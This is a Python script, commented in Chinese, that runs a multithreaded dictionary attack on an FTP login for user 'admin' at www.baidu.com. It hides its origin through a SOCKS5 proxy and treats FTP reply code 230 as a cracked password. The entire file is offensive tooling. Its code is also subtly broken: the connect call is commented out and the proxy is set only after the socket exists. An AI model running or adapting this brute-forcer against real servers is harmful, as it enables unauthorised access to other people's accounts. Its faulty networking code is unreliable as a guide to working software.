#!/usr/bin/env python
# -*- coding:utf-8 -*-

# 导入 socket 库，该库是网络编程的基础库，用于创建 socket 连接
import socket
import socks
# 导入 threading 库，该库提供了用于多线程编程的功能
import threading

# 定义 ftp 服务器地址，该地址是 FTP 服务器的 IP 地址或域名
host = "www.baidu.com"

# 定义用户名，该用户名是登录 FTP 服务器的用户名
username = "admin"

# 密码文件地址
password_file = "passwords.txt"

# # 定义密码字典，该字典包含了待爆破的密码
# passwords = ["123456", "admin", "password"]

# 定义一个线程锁，该锁用于线程间的协作，避免多线程中出现错误
lock = threading.Lock()

# 定义一个变量，该变量用于保存爆破出来的密码
password_cracked = ""


def get_proxy():
    # 这里的代码是从代理池中获取一个代理的示例代码
    # 代理池中的代码可以在网络上查找，也可以自己搭建
    proxy = "http://127.0.0.1:8080"
    return proxy


# 定义线程函数，该函数负责尝试登录 FTP 服务器，并判断是否登录成功
def attack(password):
    # 定义全局变量 password_cracked 用来记录已经爆破出来的密码
    global password_cracked
    # 获取代理
    proxy = get_proxy()
    # 创建 socket 连接
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 使用代理连接服务器
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 1080)
    socket.socket = socks.socksocket
    # s.setproxy(socket.PROXY_TYPE_HTTP, proxy)
    # s.connect((host, 21))
    # 接收服务器返回信息
    response = s.recv(1024).decode('utf-8')
    # 发送用户名到服务器
    s.send(("USER " + username + "\r\n").encode('utf-8'))
    s.recv(1024).decode('utf-8')
    # 发送密码到服务器
    s.send(("PASS " + password + "\r\n").encode('utf-8'))
    response = s.recv(1024).decode('utf-8')
    # 如果登陆成功，则获得锁，保存密码
    if "230" in response:
        lock.acquire()
        password_cracked = password
        lock.release()
    # 关闭 socket 连接
    s.close()


# 主函数，用来执行多线程爆破
def main():
    # 存储所有线程的列表
    threads = []
    # # 遍历密码字典，创建线程
    # for password in passwords:
    #     t = threading.Thread(target=attack, args=(password,))
    #     threads.append(t)

    # 读取密码字典
    with open(password_file, 'r') as f:
        passwords = f.readlines()
    # 去掉换行符
    passwords = [password.strip() for password in passwords]
    # 遍历字典，创建多线程
    threads = []
    for password in passwords:
        t = threading.Thread(target=attack, args=(password,))
        threads.append(t)
    # 启动所有线程
    for t in threads:
        t.start()
    # 等待所有线程结束
    for t in threads:
        t.join()
    # 如果已经爆破出密码，则打印出来
    if password_cracked:
        print("[*] Password cracked: %s" % password_cracked)
    else:
        print("[-] Password not found.")


# 当作为独立程序运行时，执行主函数
if __name__ == '__main__':
    main()
